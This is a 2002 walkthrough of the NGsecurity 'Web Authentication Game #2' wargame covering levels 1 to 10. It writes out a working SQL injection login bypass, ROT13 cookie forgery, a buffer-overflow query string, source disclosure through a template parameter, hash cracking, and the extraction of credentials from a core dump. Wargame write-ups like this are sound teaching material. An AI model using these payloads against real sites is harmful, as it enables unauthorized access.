@@ -1,0 +1,949 @@
+============================================================================================================
+
+                              NGsecurity Games Web Authentication Game#2 Solutions
+                                          http://quiz.ngsec.biz:8080/
+
+
+  I think the games are fun. Here is my notes/solutions on Game #2. No i did not cheat/ask
+anyone for hints or solutions, to me thats not fun nor does one learn anything by doing so.
+If you really want to play the games and mabee learn something new then don't read this.
+
+-nocon
+
+
+=============================================================================================================
+
+
+Level 1
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level1/index.php
+
+
+Solve:
+   Look at the source for:
+
+[...]
+  <!-- Pre-production: include fuctions located at data/ -->
+[...]
+
+http://quiz.ngsec.biz:8080/game2/level1/data/
+
+
+http://quiz.ngsec.biz:8080/game2/level1/data/credentials.inc
+<?
+
+     $valid_user="admin";
+     $valid_pass="bladerunner";
+
+
+?>
+
+
+
+Level 2
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level2/TakeDown.php
+
+
+Session:
+
+[...]
+
+GET /game2/level2/validate_TakeDown.php?login=admin&password= HTTP/1.1
+Host: quiz.ngsec.biz:8080
+User-Agent: Mozilla/5.0.( X11;U; Linux i6 86; en-US; rv:1.1).Gecko/20020826
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1
+Accept-Language: en-us,.en;q=0.50
+Accept-Encoding: gzip, deflate, compress;q=0.9
+Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://quiz.ngsec.biz:8080/game2/level2/TakeDown.php
+Cookie: Credentials=hfre%3Dthrfg
+
+[...]
+
+     Important part is "Cookie: Credentials=hfre%3Dthrfg" Need to change
+
+            Cookie: Credentials=hfre%3Dthrfg (Guest)
+     to read
+
+            Cookie: Credentials= <some hash>  (admin)
+
+
+Algorithum is ROT13:
+
+[nocon]$ vi rot13.c
+[nocon]$ gcc !$
+gcc rot13.c
+[nocon]$ ./a.out
+thrfg
+guest
+hfre
+user
+admin
+nqzva
+
+       admin = nqzva
+
+   So we need to have the Cookie to read "user=admin"
+
+       Cookie: Credentials=hfre%3Dnqzva
+
+
+SOLVE:
+
+[nocon]$ telnet quiz.ngsec.biz 8080
+Trying 213.4.15.133...
+Connected to quiz.ngsec.biz.
+Escape character is '^]'.
+GET /game2/level2/validate_TakeDown_cookie.php HTTP/1.1
+Host: quiz.ngsec.biz:8080
+Referer: http://quiz.ngsec.biz:8080/game2/level2/validate_TakeDown.php?login=admin&password=
+Cookie: Credentials=hfre%3Dnqzva
+
+HTTP/1.1 200 OK
+Date: Wed, 25 Dec 2002 02:22:11 GMT
+Server: Apache
+Transfer-Encoding: chunked
+Content-Type: text/html
+
+[...]
+
+<!-- -->
+
+  <center>
+
+  <span class="cab"><b>Level 2 Completed!</b></span><p>
+<p class="txt"><b>CONGRATULATIONS!!! Authentication Completed!</b></p>
+<p class="txt">At this point <b>you should update your score</b> filling this
+form.</p>
+<p class="txt"><b>Not yet registered?</b> Follow this link: <a
+href="../register.php">Registration Form</a></p>
+<form action="http://quiz1.ngsec.biz:8080/game2/update_score.php"
+method="POST">
+<input type="hidden" name="MAGIC_VALUE" value="haxor">
+<span class="txt"><b>Nickname</b></span>
+<input type="text" name="nick"><br>
+<span class="txt"><b>Password</b></span>
+<input type="password" name="password"><br>
+<input type="submit" value="Submit score">
+</form>
+52
+
+  </center>
+
+<!-- -->
+
+[...]
+
+
+Final URL:
+
+http://quiz1.ngsec.biz:8080/game2/update_score.php?nick=yournick&MAGIC_VALUE=haxor&password=yourpasswd
+
+
+
+
+Level 3
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level3/haxor.php
+
+
+SOLVE:
+
+   First see:
+      http://quiz.ngsec.biz:8080/game2/level3/validate_haxor.txt
+
+   Then check the base64 encoded string in:
+      http://quiz.ngsec.biz:8080/game2/level3/data.inc
+
+
+    Decode the string using any bas64decoder I used an online decoder at:
+        http://tools.eyeonsecurity.org/tools/Base64/base64.plx
+
+
+   This will get you decoded:
+
+       $valid_login=g00r00;
+       $valid_pass=trend;
+
+
+Log into:
+
+   http://quiz.ngsec.biz:8080/game2/level3/haxor.php
+   U: g00r00
+   P: trend
+
+
+
+Level 4
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level4/lovecrash.php
+
+
+SOLVE:
+
+   Look at the source code of lovecrash.php for "PasswordAuth.class"
+
+do
+
+  wget http://quiz.ngsec.biz:8080/game2/level4/PasswordAuth.class
+
+Get a java decompiler and decompile "PasswordAuth.class"
+
+Look for the following lines in the decompiled "PasswordAuth.java"
+
+[...]
+
+  if (texto.getText().equals("String"))
+                success();
+            else
+                failed();
+
+[...]
+
+   The password is "String"
+
+
+go to
+
+http://quiz.ngsec.biz:8080/game2/level4/lovecrash.php
+
+  and enter the password of "String"
+
+
+
+Level 5
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level5/carnival.php
+
+
+SOLVE:
+
+
+   Look at the Pseudo source code of the validate_carnival.php
+         http://quiz.ngsec.biz:8080/game2/level5/validate_carnival.txt
+
+[...]
+
+$result=mysql_db_query($db,"SELECT pass FROM $table WHERE user='$login'");
+
+  .......
+
+ if (($num_rows!=0) && (!strcasecmp(md5($password),$row[0]))) {
+
+[...]
+
+    Create a md5 hash of some password
+         http://www.instisec.com/publico/descargas/criptoaspdemo.asp?id=2
+
+    the password doesn't matter since you need to get $row[0] = "something" in Hex.
+    In this example i used "password" which is "5F4DCC3B5AA765D61D8327DEB882CF99"
+
+
+   At the login enter
+
+    Login: ' union select '5F4DCC3B5AA765D61D8327DEB882CF99
+    Password: password
+
+   This will result in the folloing passwd to mysql_db_query()
+
+        "SELECT pass FROM $table WHERE user='' union select '5F4DCC3B5AA765D61D8327DEB882CF99"
+
+    and now
+
+        $result=5F4DCC3B5AA765D61D8327DEB882CF99 and then
+
+        $num_rows=1
+        $row[0]=5F4DCC3B5AA765D61D8327DEB882CF99
+        $password="password"
+
+    the following is now passed to the fuction call strcasecmp()
+
+        strcasecmp(md5("password"),"5F4DCC3B5AA765D61D8327DEB882CF99")
+
+Final URL:
+
+http://quiz2.ngsec.biz:8080/game2/level5/validate_carnival.php?login=%27+union+select+%275F4DCC3B5AA765D61D8327DEB882CF99&password=password
+
+
+
+Level 6
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level6/echoes.php
+
+SOLVE:
+
+         Note the error from the following URL
+             http://quiz.ngsec.biz:8080/game2/level6/validate_echoes.php?login=&password=&template=1
+
+[...]
+
+Error opening tempalte file: data/1
+
+[...]
+
+         New URL
+              http://quiz.ngsec.biz:8080/game2/level6/data/
+
+[...]
+
+Index of /game2/level6/data
+
+    * Parent Directory
+    * black.inc
+    * credentials.php
+    * green.inc
+
+[...]
+
+
+         You need to retrive the source code from "credentials.php" simply clicking on will not show you the source.
+         The following URL will allow you to see the source code of "credentials.php"
+               http://quiz.ngsec.biz:8080/game2/level6/validate_echoes.php?login=&password=&template=credentials.php
+
+         Look at the source code of the error page, you should now see the following
+
+[...]
+
+<?
+
+ $valid_user="NGSEC";
+ $hash_pass="8ebdc102b9838150686fa354350cbae4";
+
+?>
+
+[...]
+
+          The password is an MD5 hash. you can use ngHashCrack
+                 http://www.ngsec.com/downloads/misc/ngHashCrack-1.0.zip
+
+               or
+
+           The much faster tool MD5Crack
+                 http://www.checksum.org/download/MD5Crack/
+
+
+     Both tools are windows programs and cracking the pasword will take some hours :-(
+
+C:\Files\ngHashCrack-1.0>nghashcrack --incremental --md5 --alpha --hash 8ebdc102b9838150686fa354350cbae4
+ngHashCrack v1.0 by NGSEC Research Team <labs@ngsec.com>
+FREEWARE hash cracker
+Next Generation Security Technologies
+http://www.ngsec.com
+
+Mode: Incremental (alphanumerical characters)
+Algorithm: MD5
+Hash: 8ebdc102b9838150686fa354350cbae4
+
++ Checking words of 1 bytes... done
++ Checking words of 2 bytes... done
++ Checking words of 3 bytes... done
++ Checking words of 4 bytes... done
++ Checking words of 5 bytes...
+
+  Hash cracked with word: "NGs3X"
+    Hexadecimal Notation: "4e47733358"
+
+C:\Files\ngHashCrack-1.0>
+
+
+       Login Info:
+
+             Login: NGSEC
+             Password: NGs3X
+
+
+
+Level 7
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level7/neuromancer.php
+
+
+SOLVE:
+
+         Look at Pseudo Source code of validate_neuromancer.cgi and Format of the Auth File.
+             http://quiz.ngsec.biz:8080/game2/level7/auth_file-format.txt
+             http://quiz.ngsec.biz:8080/game2/level7/validate_neuromancer.txt
+
+         We will overflow the "template" argument passed to the program to overrite the file
+         pointer (file[128]="/etc/ngsec-quiz2.auth) to point to an alternate password Auth file
+         (auth_file-format.txt in this case)
+
+
+         I added comments to help better understand what you are triing to accomplish.
+
+[...]
+
+char file[128]="/etc/ngsec-quiz2.auth";   /* file pointer to overwrite */
+char template[128];                       /* Buffer we will overflow   */
+
+    ........
+
+memset(template,0,sizeof(template));
+
+    ........
+
+ /**********************************/
+ /* Get Template from Query String */
+ /**********************************/
+
+ch_ptr_begin=(char *)strstr(ch_ptr_end,"template=");
+ if (ch_ptr_begin==NULL)
+             show_error();
+ ch_ptr_begin+=9;
+ ch_ptr_end=(char *)strstr(ch_ptr_begin,"&");
+ if (ch_ptr_end!=NULL) *(ch_ptr_end++)='\0';
+ strcpy(template,ch_ptr_begin);                 /*   Here is where the overflow will take place  */
+
+
+ if ((fich=fopen(file,"r"))==NULL) {            /* are we able to read our new file ??   */
+
+    printf("
+    <center>
+    <p class=\"cab\"><b>Authentication ERROR!</b></p>
+    <p class=\"txt\">Error: Could not open %s. Please go back and try again.</p>
+    </center>\n",file);
+
+    exit(-1);
+
+    }
+
+
+    ........
+
+fscanf(fich,"%127s %127s\n",good_user,good_pass);    /* here is where the program will read "auth_file-format.txt" instead of the real file    */
+fclose(fich);
+
+ if ((strlen(good_user)==0) || (strlen(good_pass)==0)) show_error();  /* username will be "user" and password will be "password"   */
+
+
+    ........
+
+ if ((strcmp(user,good_user)==0) && (strcmp(pass,good_pass)==0)) {       /* username will be "user" and password will be "password"   */
+
+    // AUTH OK STUFF                                                     /* All checks passed, and we are authenticated    */
+
+    } else {
+
+
+    show_error();
+
+    }
+
+
+[...]
+
+
+        Final URL:
+            http://quiz.ngsec.biz:8080/game2/level7/validate_neuromancer.cgi?login=user&password=password&template=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAauth_file-format.txt
+
+
+
+Level 8
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level8/eon_eon.php
+
+SOLVE:
+
+       Pretty much the same as level 6. Look at the source code of
+          http://quiz.ngsec.biz:8080/game2/level8/eon_eon.php
+
+[...]
+
+    good_login="e852191079ea08b654ccf4c2f38a162e3e84ee04";
+    good_pass="714eea0f4c980736bde0065fe73f573487f08e3a";
+
+[...]
+
+       You can read the RFC3174 and/or
+            http://quiz.ngsec.biz:8080/game2/level8/sha1.js
+
+       I didn't Bother. The username/password is an sha1 hash. you can use ngHashCrack (Windows exe)
+            http://www.ngsec.com/downloads/misc/ngHashCrack-1.0.zip
+       or
+
+       SHA-1 Cracker (Very Fucking Fast!!)    /* found this in a fourm ;-P , this guy deserves props */
+            http://www.zesoi.fer.hr/~bzdrnja/sha1crack.tar
+
+
+[nocon]$ tar -xvf sha1crack.tar
+sha1crack/
+sha1crack/sha1.h
+sha1crack/sha1crack.c
+sha1crack/sha1crack
+[nocon]$ cd sha1crack/
+[nocon]$ ./sha1crack
+
+Usage: sha1crack [string] hash
+[nocon]$ date ; ./sha1crack e852191079ea08b654ccf4c2f38a162e3e84ee04 ;date
+Mon Dec 30 22:47:49 CST 2002
+Current cracking level 0
+Current cracking level 1
+Current cracking level 2
+Current cracking level 3
+Current cracking level 4
+Result found: crack
+Mon Dec 30 22:48:11 CST 2002
+
+[nocon]$ date ; ./sha1crack 714eea0f4c980736bde0065fe73f573487f08e3a ; date
+Mon Dec 30 22:49:12 CST 2002
+Current cracking level 0
+Current cracking level 1
+Current cracking level 2
+Current cracking level 3
+Result found: time
+Mon Dec 30 22:49:17 CST 2002
+[nocon]$
+
+
+       Login: crack
+       Password: time
+
+
+
+Level 9
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level9/tuxy.php
+
+SOLVE:
+
+       Look at the non-valid examples.
+           http://quiz.ngsec.biz:8080/game2/level9/user_passwords.txt
+
+[...]
+
+admin     3cf108a4e0a498347a5a75a792f23212
+
+[...]
+
+      READ the username and passwords, look at them and look at them more.
+      They are not valid MD5 hash's (per say :) ). Think about the statment
+      "Passwords may be user dependant..."
+
+
+[nocon]$ echo -n admin | md5sum
+21232f297a57a5a743894a0e4a801fc3  -
+[nocon]$
+
+       Compare Orig to the one just created.
+
+admin     3cf108a4e0a498347a5a75a792f23212
+--------
+admin     21232f297a57a5a743894a0e4a801fc3
+
+
+       The username and password  combo would then be
+
+username   md5_hash_but_only_reverse
+
+
+        Just make up a username and the password would be the md5 hash in
+        reverse and login. You can use one of the previous levels Hints
+              http://www.instisec.com/publico/descargas/criptoaspdemo.asp?id=2
+
+
+
+Level 10
+-----------------------------------
+URL:
+http://quiz.ngsec.biz:8080/game2/level10/FHER.php
+
+
+SOLVE:
+
+       This level I have to say i learned quite a bit, it took me a while to figure this out since i
+don't know assembly at all  an just the basics of gdb.  the first thing is that you need to look at the
+
+Pseudo source code of validate_FHER.cgi
+     http://quiz.ngsec.biz:8080/game2/level10/validate_FHER.txt
+
+  If you notice the lines in the code
+
+[...]
+
+ ch_ptr_begin=(char *)strstr(argv[1],"login=");
+ if (ch_ptr_begin==NULL)
+             show_error();
+ ch_ptr_begin+=6;
+ ch_ptr_end=(char *)strstr(ch_ptr_begin,"&");
+
+[...]
+
+     The second call to strstr() is looking for a "&" if we supply a login=bla
+with no "&" on the end, the program will segfault. to test d/l the Pseudo source code
+compile and test
+
+   [nocon]$ gcc validate.c
+   [nocon]$ ltrace -C ./a.out "login=whatever"
+    __libc_start_main(0x08048530, 2, 0xbffffb84, 0x08048350, 0x08048780 <unfinished ...>
+    __register_frame_info(0x080498d0, 0x080499e0, 0xbffffb28, 0x0804843e, 0x08048350) = 0x080498d0
+    memset(0xbffffa90, '\000', 128)                   = 0xbffffa90
+    strstr("login=whatever", "login=")                = "login=whatever"
+    strstr("whatever", "&")                           = NULL
+    --- SIGSEGV (Segmentation fault) ---
+    +++ killed by SIGSEGV +++
+
+  From the man page of strstr()
+
+[...]
+
+BUGS
+       Early versions of Linux libc (like 4.5.26) would  not  allow  an  empty
+       argument.  Later  versions  (like  4.6.27)  work  correctly, and return
+       haystack when needle is empty.
+
+[...]
+
+    OK, so we know that the program will crash, normaly this kind of thing will/should (see ulimit)
+generate a core file, so entering a login with no password to the URL
+
+        http://quiz.ngsec.biz:8080/game2/level10/FHER.php
+
+   we get an error, now  note the URL of the error page
+       http://quiz.ngsec.biz:8080/game2/level10/validate_FHER.cgi?login=&password=
+
+   If we change and enter the URL to something like
+       http://quiz.ngsec.biz:8080/game2/level10/validate_FHER.cgi?login=bla
+
+   the result is no error page, so we can assume the program crashed, now grab the core file.
+       http://quiz.ngsec.biz:8080/game2/level10/core
+
+
+   The core file is basicly a dump of the program and what state the system was in when the program
+crashed. core files are used for debugging problems in programs and can contain information from memory
+stack etc.. Since the core file is there we can assume that this file is the key to passing this level.
+
+   First thing i did was look at the file using "stings" to see if the plain text user/pass was in this file
+
+     [nocon]$ strings core
+
+   This will spit out a bunch of text and some of the information may look valid, however there is too much
+in there to try them all. one thing to note is the following output.
+
+[...]
+
+<span class="cab"><b>Level 10 Completed!</b></span><p>
+<p class="txt"><b>CONGRATULATIONS!!! Authentication Completed!</b></p>
+<p class="txt">At this point <b>you should update your score</b> filling this form.</p>
+<p class="txt"><b>Not yet registered?</b> Follow this link: <a href="../register.php">Registration Form</a></p>
+<form action="http://quiz1.ngsec.biz:8080/game2/update_score.php" method="POST">
+<input type="hidden" name="MAGIC_VALUE" value="%s">
+<span class="txt"><b>Nickname</b></span>
+<input type="text" name="nick"><br>
+<span class="txt"><b>Password</b></span>
+<input type="password" name="password"><br>
+<input type="submit" value="Submit score">
+
+[...]
+
+   As with past levels instead of looking for user/pass combo we now have another possiblility and that
+is "MAGIC_VALUE".
+
+   This is where i had to learn a tiny bit of assembly and how arrays are stored in memory. I won't go
+into that, but the main thing to note here is that in assembly the "mov" instruction moves/stores data.
+ithis includes values in arrays
+
+[...]
+
+MOV: moves a value from one place to another.
+Syntax:
+
+MOV destination, source
+
+for example:
+
+mov ax,10 	; moves an immediate value into ax
+mov bx,cx 	; moves value from cx into bx
+mov dx,Number 	; moves the value of Number into dx
+
+[...]
+
+    Lookiing back agian at the Pseudo source code, we can see that we have 2 arrays
+
+[...]
+
+char good_user[48]="XXXX";
+char good_pass[48]="XXXX";
+
+[...]
+
+   These are obviously NOT the username and password used to pass this level but, we can see that
+these strings are saved on the stack and chances are pretty good that they may be in the core file.
+This is what you need to look for. I used objdump to get assembly output from the core file. What
+we are looking for is the "mov" instructions
+
+      [nocon]$ objdump -D ./core | grep mov
+
+  Doing this will spit a buch of information to the screen, if you notice there will be a big section
+of "movb" instructions. This setions is where our username,password and MAGIC_VALUE  will be at
+
+
+[nocon]$ objdump -D ./core | grep movb
+objdump: ./core: no symbols
+
+[...]
+
+ 80495fa:       c6 85 b8 fa ff ff 59    movb   $0x59,0xfffffab8(%ebp)
+ 8049601:       c6 85 f4 fe ff ff 64    movb   $0x64,0xfffffef4(%ebp)
+ 8049608:       c6 85 f3 fe ff ff 65    movb   $0x65,0xfffffef3(%ebp)
+ 804960f:       c6 85 88 fa ff ff 53    movb   $0x53,0xfffffa88(%ebp)
+ 8049616:       c6 85 b9 fa ff ff 69    movb   $0x69,0xfffffab9(%ebp)
+ 804961d:       c6 85 89 fa ff ff 33    movb   $0x33,0xfffffa89(%ebp)
+ 8049624:       c6 85 ba fa ff ff 68    movb   $0x68,0xfffffaba(%ebp)
+ 804962b:       c6 85 8a fa ff ff 33    movb   $0x33,0xfffffa8a(%ebp)
+ 8049632:       c6 85 bb fa ff ff 64    movb   $0x64,0xfffffabb(%ebp)
+ 8049639:       c6 85 8b fa ff ff 6c    movb   $0x6c,0xfffffa8b(%ebp)
+ 8049640:       c6 85 bc fa ff ff 34    movb   $0x34,0xfffffabc(%ebp)
+ 8049647:       c6 85 f2 fe ff ff 72    movb   $0x72,0xfffffef2(%ebp)
+ 804964e:       c6 85 8c fa ff ff 6f    movb   $0x6f,0xfffffa8c(%ebp)
+ 8049655:       c6 85 bd fa ff ff 35    movb   $0x35,0xfffffabd(%ebp)
+ 804965c:       c6 85 8d fa ff ff 55    movb   $0x55,0xfffffa8d(%ebp)
+ 8049663:       c6 85 be fa ff ff 75    movb   $0x75,0xfffffabe(%ebp)
+ 804966a:       c6 85 8e fa ff ff 36    movb   $0x36,0xfffffa8e(%ebp)
+ 8049671:       c6 85 bf fa ff ff 65    movb   $0x65,0xfffffabf(%ebp)
+ 8049678:       c6 85 8f fa ff ff 6e    movb   $0x6e,0xfffffa8f(%ebp)
+ 804967f:       c6 85 c0 fa ff ff 37    movb   $0x37,0xfffffac0(%ebp)
+ 8049686:       c6 85 f1 fe ff ff 6f    movb   $0x6f,0xfffffef1(%ebp)
+ 804968d:       c6 85 90 fa ff ff 65    movb   $0x65,0xfffffa90(%ebp)
+ 8049694:       c6 85 c1 fa ff ff 64    movb   $0x64,0xfffffac1(%ebp)
+ 804969b:       c6 85 91 fa ff ff 38    movb   $0x38,0xfffffa91(%ebp)
+ 80496a2:       c6 85 c2 fa ff ff 39    movb   $0x39,0xfffffac2(%ebp)
+ 80496a9:       c6 85 92 fa ff ff 31    movb   $0x31,0xfffffa92(%ebp)
+ 80496b0:       c6 85 c3 fa ff ff 39    movb   $0x39,0xfffffac3(%ebp)
+ 80496b7:       c6 85 93 fa ff ff 00    movb   $0x0,0xfffffa93(%ebp)
+
+ 80496be:       c6 85 c4 fa ff ff 69    movb   $0x69,0xfffffac4(%ebp)
+ 80496c5:       c6 85 c5 fa ff ff 31    movb   $0x31,0xfffffac5(%ebp)
+ 80496cc:       c6 85 c6 fa ff ff 31    movb   $0x31,0xfffffac6(%ebp)
+ 80496d3:       c6 85 c7 fa ff ff 00    movb   $0x0,0xfffffac7(%ebp)
+
+ 80496da:       c6 85 f0 fe ff ff 63    movb   $0x63,0xfffffef0(%ebp)
+ 80496e1:       c6 85 f5 fe ff ff 75    movb   $0x75,0xfffffef5(%ebp)
+ 80496e8:       c6 85 f6 fe ff ff 6d    movb   $0x6d,0xfffffef6(%ebp)
+ 80496ef:       c6 85 f7 fe ff ff 70    movb   $0x70,0xfffffef7(%ebp)
+ 80496f6:       c6 85 f8 fe ff ff 65    movb   $0x65,0xfffffef8(%ebp)
+ 80496fd:       c6 85 f9 fe ff ff 64    movb   $0x64,0xfffffef9(%ebp)
+ 8049704:       c6 85 fa fe ff ff 00    movb   $0x0,0xfffffefa(%ebp)
+
+[...]
+
+
+    Using gdb we can print the different sections
+
+[nocon]$ gdb -c ./core -q
+Core was generated by `./validate login=aaa'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x080485c3 in ?? ()
+(gdb) printf "%s\n",0x80496be
+i11
+(gdb) printf "%s\n",0x80496da
+cumped
+(gdb) printf "%s\n",0x80495fa
+YdeSi3h3dl4ro5Uu6en7oed8919
+(gdb)
+
+    This is what were are looking for, username, password and MAGIC_VALUE. Using these as they are
+will not work. forwards, backwards it doesn't matter. I tried that ;-(. If you notice the "movb"
+instuctions you'll see that they too also point to memory addresses
+
+[...]
+
+movb   $0x64,0xfffffef9(%ebp)
+movb   $0x0,0xfffffefa(%ebp)
+
+[...]
+
+   What those mean is  "move $0x64 to mem addr 0xfffffef9 in register ebp" (if i understand that right)
+if you look at all the movb sections all the memory addresses are not in order, so  we must put them in
+oder. To do this i wrote some simple scripts and a small C program to sort the memory addreess and put
+them in order. I am sure there are better utils out there for this, i dunno i didn't look and was much
+faster to do it my self. first thing was i need the full range of mem addrress starting from 0xfffff000
+and ending with 0xffffffff since the address above do not go out of that range. (took some playing
+around to get the right range) We need to get the address in seqental order since this is how stuff is
+stored in memory.
+
+[nocon]$ cat printmem.c
+#include <stdio.h>
+
+#define NUM 4095
+
+int main()
+{
+        int x,addr = 0xfffff000;
+
+        for(x=0;x<NUM;x++) {
+                    printf("0x%lx\n",addr);
+                    addr++;
+        }
+
+        return 0;
+}
+[nocon]$ gcc printmem.c
+[nocon]$ ./a.out > memaddrs.txt
+[nocon]$ head -5 memaddrs.txt
+0xfffff000
+0xfffff001
+0xfffff002
+0xfffff003
+0xfffff004
+[nocon]$ wc -l memaddrs.txt
+   4095 memaddrs.txt
+[nocon]$
+
+      So I redirected the output to a flat text file. This file will be the address to look for "in order"
+the next thing i did was take the above output from objdump and put that into another text file and edited
+it much like you see above
+
+[nocon]$ objdump -D core.1 | grep movb > objdump.out
+objdump: core.1: no symbols
+[nocon]$ vi objdump.out
+[nocon]$ cat objdump.out
+ 80495fa:       c6 85 b8 fa ff ff 59    movb   $0x59,0xfffffab8(%ebp)
+ 8049601:       c6 85 f4 fe ff ff 64    movb   $0x64,0xfffffef4(%ebp)
+ 8049608:       c6 85 f3 fe ff ff 65    movb   $0x65,0xfffffef3(%ebp)
+ 804960f:       c6 85 88 fa ff ff 53    movb   $0x53,0xfffffa88(%ebp)
+ 8049616:       c6 85 b9 fa ff ff 69    movb   $0x69,0xfffffab9(%ebp)
+ 804961d:       c6 85 89 fa ff ff 33    movb   $0x33,0xfffffa89(%ebp)
+ 8049624:       c6 85 ba fa ff ff 68    movb   $0x68,0xfffffaba(%ebp)
+ 804962b:       c6 85 8a fa ff ff 33    movb   $0x33,0xfffffa8a(%ebp)
+ 8049632:       c6 85 bb fa ff ff 64    movb   $0x64,0xfffffabb(%ebp)
+ 8049639:       c6 85 8b fa ff ff 6c    movb   $0x6c,0xfffffa8b(%ebp)
+ 8049640:       c6 85 bc fa ff ff 34    movb   $0x34,0xfffffabc(%ebp)
+ 8049647:       c6 85 f2 fe ff ff 72    movb   $0x72,0xfffffef2(%ebp)
+ 804964e:       c6 85 8c fa ff ff 6f    movb   $0x6f,0xfffffa8c(%ebp)
+ 8049655:       c6 85 bd fa ff ff 35    movb   $0x35,0xfffffabd(%ebp)
+ 804965c:       c6 85 8d fa ff ff 55    movb   $0x55,0xfffffa8d(%ebp)
+ 8049663:       c6 85 be fa ff ff 75    movb   $0x75,0xfffffabe(%ebp)
+ 804966a:       c6 85 8e fa ff ff 36    movb   $0x36,0xfffffa8e(%ebp)
+ 8049671:       c6 85 bf fa ff ff 65    movb   $0x65,0xfffffabf(%ebp)
+ 8049678:       c6 85 8f fa ff ff 6e    movb   $0x6e,0xfffffa8f(%ebp)
+ 804967f:       c6 85 c0 fa ff ff 37    movb   $0x37,0xfffffac0(%ebp)
+ 8049686:       c6 85 f1 fe ff ff 6f    movb   $0x6f,0xfffffef1(%ebp)
+ 804968d:       c6 85 90 fa ff ff 65    movb   $0x65,0xfffffa90(%ebp)
+ 8049694:       c6 85 c1 fa ff ff 64    movb   $0x64,0xfffffac1(%ebp)
+ 804969b:       c6 85 91 fa ff ff 38    movb   $0x38,0xfffffa91(%ebp)
+ 80496a2:       c6 85 c2 fa ff ff 39    movb   $0x39,0xfffffac2(%ebp)
+ 80496a9:       c6 85 92 fa ff ff 31    movb   $0x31,0xfffffa92(%ebp)
+ 80496b0:       c6 85 c3 fa ff ff 39    movb   $0x39,0xfffffac3(%ebp)
+ 80496b7:       c6 85 93 fa ff ff 00    movb   $0x0,0xfffffa93(%ebp)
+
+
+ 80496be:       c6 85 c4 fa ff ff 69    movb   $0x69,0xfffffac4(%ebp)
+ 80496c5:       c6 85 c5 fa ff ff 31    movb   $0x31,0xfffffac5(%ebp)
+ 80496cc:       c6 85 c6 fa ff ff 31    movb   $0x31,0xfffffac6(%ebp)
+ 80496d3:       c6 85 c7 fa ff ff 00    movb   $0x0,0xfffffac7(%ebp)
+
+
+ 80496da:       c6 85 f0 fe ff ff 63    movb   $0x63,0xfffffef0(%ebp)
+ 80496e1:       c6 85 f5 fe ff ff 75    movb   $0x75,0xfffffef5(%ebp)
+ 80496e8:       c6 85 f6 fe ff ff 6d    movb   $0x6d,0xfffffef6(%ebp)
+ 80496ef:       c6 85 f7 fe ff ff 70    movb   $0x70,0xfffffef7(%ebp)
+ 80496f6:       c6 85 f8 fe ff ff 65    movb   $0x65,0xfffffef8(%ebp)
+ 80496fd:       c6 85 f9 fe ff ff 64    movb   $0x64,0xfffffef9(%ebp)
+ 8049704:       c6 85 fa fe ff ff 00    movb   $0x0,0xfffffefa(%ebp)
+[nocon]$
+
+    I just removed the "movb" sections that were not important like "movb   $0x0,(%edx)". The next thing
+was i wrote a small shell script that wil sort the file objdump.out using the sorted memory addresses in
+memaddrs.txt and then redirect that output to another file.
+
+[nocon]$ vi sort.sh
+[nocon]$ cat sort.sh
+#!/bin/sh
+
+X=0
+for addr in `cat ./memaddrs.txt` ; do
+
+      grep "$addr" objdump.out
+      X=`expr $X + 1`
+done
+[nocon]$ chmod 555 sort.sh
+[nocon]$ ./sort.sh > sorted.dump
+
+   Now we have a sorted dump file with all the mem ory addresses in sequential order.
+
+[nocon]$ head -20 sorted.dump
+ 804960f:       c6 85 88 fa ff ff 53    movb   $0x53,0xfffffa88(%ebp)
+ 804961d:       c6 85 89 fa ff ff 33    movb   $0x33,0xfffffa89(%ebp)
+ 804962b:       c6 85 8a fa ff ff 33    movb   $0x33,0xfffffa8a(%ebp)
+ 8049639:       c6 85 8b fa ff ff 6c    movb   $0x6c,0xfffffa8b(%ebp)
+ 804964e:       c6 85 8c fa ff ff 6f    movb   $0x6f,0xfffffa8c(%ebp)
+ 804965c:       c6 85 8d fa ff ff 55    movb   $0x55,0xfffffa8d(%ebp)
+
+[...]
+
+     Now what were need to do is retrive the "sorted" strings from this file. If you look at
+each line in the file you will see where we get the characters. They are in HEX
+
+        804960f:       c6 85 88 fa ff ff 53    movb   $0x53,0xfffffa88(%ebp)
+                                        |__|          |____|
+                                         |              |______________  HEX value for 'S'
+                                         |_____________________________  HEX value for 'S'
+
+    These values is what we want and now they are in order. To make things easier to read
+i put just those values in a text file like so.
+
+[nocon]$ cat sorted.dump | awk '{print $8}' > ascii-codes.txt
+[nocon]$ cat ascii-codes.txt
+53
+33
+33
+6c
+6f
+55
+36
+6e
+65
+38
+31
+00
+59
+69
+68
+64
+34
+35
+75
+65
+37
+64
+39
+39
+69
+31
+31
+00
+63
+6f
+72
+65
+64
+75
+6d
+70
+65
+64
+00
+[nocon]$
+
+    To find the coisponding value for each of the HEX values just do "man ascii". The zero's are just
+NULL and separate each sections of "usernmae" "password" and "MAGIC_VALUE".
+
+    I leave the rest up to you ;-P
+
+
+
+- nocon
+
+================================================================================================================================
